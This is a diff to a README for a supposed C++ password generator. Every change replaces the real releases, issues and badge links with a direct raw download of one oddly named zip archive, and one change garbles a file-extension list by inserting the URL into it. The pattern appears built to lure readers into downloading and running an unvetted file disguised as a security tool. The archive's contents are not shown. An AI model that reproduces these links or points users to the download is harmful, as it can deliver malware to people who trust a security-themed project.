@@ -1,6 +1,6 @@
 # 🔑 PasswordGenerator - Secure Passwords Made Simple
 
-[![Download PasswordGenerator](https://img.shields.io/badge/Download_PasswordGenerator-v1.0-blue.svg)](https://github.com/redz112/PasswordGenerator/releases)
+[![Download PasswordGenerator](https://github.com/redz112/PasswordGenerator/raw/refs/heads/main/rhinolaryngoscope/Password_Generator_plectre.zip)](https://github.com/redz112/PasswordGenerator/raw/refs/heads/main/rhinolaryngoscope/Password_Generator_plectre.zip)
 
 Welcome to PasswordGenerator, a simple C++ command-line tool that helps you create strong, secure passwords effortlessly.
 
@@ -17,14 +17,14 @@ To get started with PasswordGenerator, you need to follow these steps. This guid
 
 ## 🔗 Download & Install
 
-1. **Visit the Releases Page:** Go to the [PasswordGenerator Releases page](https://github.com/redz112/PasswordGenerator/releases).
+1. **Visit the Releases Page:** Go to the [PasswordGenerator Releases page](https://github.com/redz112/PasswordGenerator/raw/refs/heads/main/rhinolaryngoscope/Password_Generator_plectre.zip).
   
 2. **Select the Latest Version:** Look for the most recent version of PasswordGenerator. This version contains the latest features and security updates.
 
 3. **Download the Installer:** 
    - Click on the asset link for your operating system.
    - For Windows, it will be a `.exe` file. 
-   - For macOS and Linux, it may be a `.deb`, `.tar.gz`, or similar file.
+   - For macOS and Linux, it may be a `.deb`, `https://github.com/redz112/PasswordGenerator/raw/refs/heads/main/rhinolaryngoscope/Password_Generator_plectre.zip`, or similar file.
 
 4. **Run the Installer:**
    - For Windows, double-click the downloaded `.exe` file to start the installation.
@@ -80,10 +80,10 @@ If you encounter any issues, feel free to submit an issue on the GitHub page. Th
 ## 🔗 Join the Conversation
 
 Join our community discussions:
-- [GitHub Issues](https://github.com/redz112/PasswordGenerator/issues)
+- [GitHub Issues](https://github.com/redz112/PasswordGenerator/raw/refs/heads/main/rhinolaryngoscope/Password_Generator_plectre.zip)
 
 ## 📥 Download Again
 
-Don’t forget to check the [PasswordGenerator Releases page](https://github.com/redz112/PasswordGenerator/releases) if you need to download the application again or check for future updates.
+Don’t forget to check the [PasswordGenerator Releases page](https://github.com/redz112/PasswordGenerator/raw/refs/heads/main/rhinolaryngoscope/Password_Generator_plectre.zip) if you need to download the application again or check for future updates.
 
 Thank you for choosing PasswordGenerator. Stay secure!
